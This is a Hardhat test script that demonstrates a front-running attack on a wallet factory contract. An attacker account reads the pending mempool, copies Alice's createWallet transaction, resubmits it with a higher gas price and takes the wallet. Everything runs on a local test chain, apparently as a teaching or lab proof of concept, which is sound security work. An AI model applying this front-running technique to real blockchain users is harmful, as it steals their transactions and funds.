const { ethers } = require("hardhat");
const { abi:WalletContractAbi } = require('../artifacts/contracts/Wallet.sol/Wallet.json');

async function main() {
  const [deployer, alice, attacker] = await ethers.getSigners();
  console.log('Deployer address:', deployer.address);
  console.log('Alice address:', alice.address);
  console.log('Attacker address:', attacker.address);

  const Factory = await ethers.getContractFactory('FactoryContract');
  const factory = await Factory.deploy();

  const salt = ethers.utils.keccak256(ethers.utils.toUtf8Bytes('Some Salt'));
  await factory.connect(alice).createWallet(salt);

  console.log('Attacker Performing Front Running...');
  // Get all transactions in the mempool
  const txs = await ethers.provider.send('eth_getBlockByNumber', [
    'pending',
    true,
  ]);

  // Find the transactions
  const tx = txs.transactions.find(
    (tx) => tx.to === factory.address.toLowerCase()
  );

  // Send transaction with more gas
  await attacker.sendTransaction({
    to: tx.to,
    data: tx.input,
    gasPrice: ethers.BigNumber.from(tx.gasPrice).add(100),
    gasLimit: ethers.BigNumber.from(tx.gas).add(100_000),
  });

  // Mine all the transactions
  await ethers.provider.send('evm_mine', []);

  const attackerWalletAddress = await factory.walletOwner(attacker.address);
  const attackerWallet = await ethers.getContractAt(
    WalletContractAbi,
    attackerWalletAddress,
    attacker
  );
  await ethers.provider.send('evm_mine', []);
  const aliceWallet = await ethers.getContractAt(
    WalletContractAbi,
    await factory.walletOwner(alice.address),
    alice
  );

  console.log("");
  console.log('Alice\'s wallet address:', await factory.walletOwner(alice.address));
  try {
    console.log('Is Alice\'s wallet initialized:', await aliceWallet.initialized());
  } catch (error) {
    console.log('Is Alice\'s wallet initialized:', false);
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
